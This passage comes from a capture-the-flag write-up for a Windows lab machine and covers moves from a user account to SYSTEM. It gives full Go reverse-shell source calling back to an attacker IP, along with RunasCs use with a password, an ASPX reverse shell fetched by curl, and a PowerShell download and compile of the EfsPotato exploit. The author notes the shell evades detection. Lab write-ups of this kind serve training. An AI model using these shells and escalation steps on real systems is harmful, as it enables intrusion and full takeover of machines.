![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FHbrdoznC6LDCVP7bzfKz%252Fgrafik.png%3Falt%3Dmedia%26token%3D1b2db230-839b-4266-aaee-a0b1e1423d92\&width=768\&dpr=3\&quality=100\&sign=8330da5b\&sv=2)

What we can do, however, is start a reverse shell in the context of the user `web_admin` using `RunasCs.exe`.

For a more interactive shell, we use our go reverse shell, which has remained undetected so far.

`0xb0b.go`

```go
package main

import (
    "net"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "10.200.37.204:4445")
    cmd := exec.Command("powershell")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```

We compile the reverse shell as follows on our Exegol instance:

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o 0xb0b.exe 0xb0b.go
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FMyHbKA6UB8iQTqPDdoRX%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd888ecfc-8201-4301-98dd-84f09357ab99\&width=768\&dpr=3\&quality=100\&sign=38e9ca3d\&sv=2)

Next, we run a listener to catch the reverse shell. For this purpose we use Penelope:

[GitHub - brightio/penelope: Penelope Shell Handler](https://github.com/brightio/penelope)

```bash
penelope -p 443
```

The reverse shell binary prepares and RunasCs.exe in the current working folder, we reconnect (if interrupted) using evil-winrm to the target as `emma.hayes`.

We will place the binaries in a global folder accessible to all users. In this case, `C:\Temp`.

We upload the binaries.

```bash
upload RunasCs.exe
```

```bash
upload 0xb0b.exe
```

Next, we execute our reverse shell binary `0xb0b.exe` in the context of the `web_admin` user:

```bash
.\RunasCs.exe web_admin 'Pwned123@!' C:\Temp\0xb0b.exe
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FccNpaKtZ1GbTHTe5mSki%252Fgrafik.png%3Falt%3Dmedia%26token%3D54be4881-26ba-48dc-a6ad-c5ebcd5a00f1\&width=768\&dpr=3\&quality=100\&sign=fe8f2258\&sv=2)

We receive a connection...

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FsCepviIe3QomVmfkvdtU%252Fgrafik.png%3Falt%3Dmedia%26token%3D8b014cec-c448-4b54-827c-3fdc50b4369f\&width=768\&dpr=3\&quality=100\&sign=c5e2a516\&sv=2)

... we are `web_admin`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FxLqSrKzzLJeP9kRDtCeR%252Fgrafik.png%3Falt%3Dmedia%26token%3D8cd54e64-6a1c-45cc-a106-8b5c864a999f\&width=768\&dpr=3\&quality=100\&sign=7b778465\&sv=2)

### Shell as iis apppool\defaultapppool

For our reverse shell, we use the following ASPX file:

[aspx-reverse-shell/shell.aspx at master · borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)

In this file, we adjust the port and IP address. For clarity's sake, we choose a different port than before, even though Penelope supports and can capture multiple reverse shell on the same port.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FSf8nHvZXvPJVnqfA5mFb%252Fgrafik.png%3Falt%3Dmedia%26token%3D89ab1473-7c22-4c59-9d50-71c804e20c3b\&width=768\&dpr=3\&quality=100\&sign=67cc4173\&sv=2)

Despite using Penelope, the upload function fails. We start a Python web server to place the reverse shell.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FCIunqVKC898aKV8kBsdw%252Fgrafik.png%3Falt%3Dmedia%26token%3D0a7ea3fb-e45d-439d-943d-fc99a53ef979\&width=768\&dpr=3\&quality=100\&sign=831cb209\&sv=2)

Next, we bring the shell to the machine using cURL alias.

```bash
curl http://10.200.37.204/shell.aspx -o shell.aspx
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FahgYTWOTffBVSYPuKBRj%252Fgrafik.png%3Falt%3Dmedia%26token%3D58ab1f8d-bc5d-46e4-901f-4c498bc85599\&width=768\&dpr=3\&quality=100\&sign=d7acfe82\&sv=2)

Then we create a new listener using Penelope. Here using port `4446`.

```bash
penelope -p 4446
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FtVPBkiDHVy7bYop4kJQa%252Fgrafik.png%3Falt%3Dmedia%26token%3D252b005b-94b2-476f-9338-704e4e9ec1ed\&width=768\&dpr=3\&quality=100\&sign=310c486c\&sv=2)

Next, we call the reverse shell as follows:

```
http://city.local/shell.aspx
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252F6hbzwk5f4WAPnwsEu1g0%252Fgrafik.png%3Falt%3Dmedia%26token%3Dd4df24f6-2610-4c22-b109-02777d3e85c2\&width=768\&dpr=3\&quality=100\&sign=fc03722\&sv=2)

After a little longer, we get a connection. We are iis apppool\defaultapppool.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FgjdfvOJxcQOx5VLcZASb%252Fgrafik.png%3Falt%3Dmedia%26token%3D6bdec0bf-65ac-4a48-8fbc-d0fab05716cc\&width=768\&dpr=3\&quality=100\&sign=a9039334\&sv=2)

### Shell as NT AUTHORITY SYSTEM

We see that we, as this user, have the `SeImpersonatePivilige` permission active.

```bash
whoami /priv
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FzGBDbFrk8wtfFHlGsSNu%252Fgrafik.png%3Falt%3Dmedia%26token%3D7c5cff2b-fb03-48f6-89ce-3a917ac04f74\&width=768\&dpr=3\&quality=100\&sign=65a869cf\&sv=2)

Since the `SeImpersonatePrivilege` is `enabled` we can make use of one of the infamous potato exploits. One of my favorite Potato exploits is the `EfsPotato` exploit. We can compile this on the machine if the `C#` compiler is available, and it should also go undetected.

[GitHub - zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).](https://github.com/zcgonvh/EfsPotato)

We check for a compiler at `C:\Windows\Microsoft.Net\Framework\` and see a `v4.0` version is persent. Nice.

```bash
dir C:\Windows\Microsoft.Net\Framework\
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FxMszt9tN6WL0jMYvcqqu%252Fgrafik.png%3Falt%3Dmedia%26token%3De5dbd987-aedd-4c26-96e3-17b5276bfb47\&width=768\&dpr=3\&quality=100\&sign=2c783a11\&sv=2)

The `csc.exe` to compile the exploit is present.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FykzExpEAg8sa2HPI9Gxt%252Fgrafik.png%3Falt%3Dmedia%26token%3D90241f87-e153-4ead-a514-c8bbaf12224f\&width=768\&dpr=3\&quality=100\&sign=4293de96\&sv=2)

Next, we download the source file from our attacker machine, compile with the compiler found at `C:\Windows\Microsoft.Net\Framework\v4...` and execute it with the `whoami` command.

We download the file:

```bash
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.200.37.204/EfsPotato/EfsPotato.cs','./EfsPotato.cs')"
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252Ftg5Lvul8nlq0VL0IXwdp%252Fgrafik.png%3Falt%3Dmedia%26token%3D14e159bc-465d-4087-82e5-a9f0829ed49c\&width=768\&dpr=3\&quality=100\&sign=777635e6\&sv=2)

Compile the potato exploit:

```bash
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FX8MEmpSeIMRogPUcCvY9%252Fgrafik.png%3Falt%3Dmedia%26token%3Dae409769-a793-4bda-9e8d-ce475ad740ba\&width=768\&dpr=3\&quality=100\&sign=5b00eb83\&sv=2)

Run `whoami` with the exploit. We are `NT authority\system`.

```bash
.\EfsPotato.exe whoami
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FhF10U2V4sVQV8k0OPWuX%252Fgrafik.png%3Falt%3Dmedia%26token%3D4f293f7d-cd5c-4463-b7f5-aadd8eedbb03\&width=768\&dpr=3\&quality=100\&sign=ae126f4e\&sv=2)

Using the exploit we run our reverse shell binary again, `Penelope` can handle multiple connections.

```bash
.\EfsPotato.exe "cmd.exe /c C:\Temp\0xb0b.exe"
```

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F~%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FAlCSV1uNQ5VBvevUTP7k%252Fgrafik.png%3Falt%3Dmedia%26token%3D5f33e94e-9638-4a48-bf36-9c8172485b06\&width=768\&dpr=3\&quality=100\&sign=30f63d04\&sv=2)

We receive another session on our Penelope instance running on port `4445`.

We can deattach our current session in this case with `CTRL + D`.

To interact with the new session we issue `session 2`.

We are `NT AUTHORITY SYSTEM` and find the final flag at `C:\Users\Administrator\root.txt`.

![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F~%2Ffiles%252Fv0%252Fb%252Fgitbook-x-prod.appspot.com%252Fo%252Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FvhHFfxIzbwX7f5mr9beT%252Fgrafik.png%3Falt%3Dmedia%26token%3Da263bde3-bc96-4670-924f-67f5d0f4f4dc\&width=768\&dpr=3\&quality=100\&sign=c2deb3d2\&sv=2)

### Recommendation

Don't miss out on the full-fledged pentest report that DKob has created for the scenario!

[City Council | Pentest Report | Pentest Reports](https://docs.dragkob.com/hacksmarter/city-council)
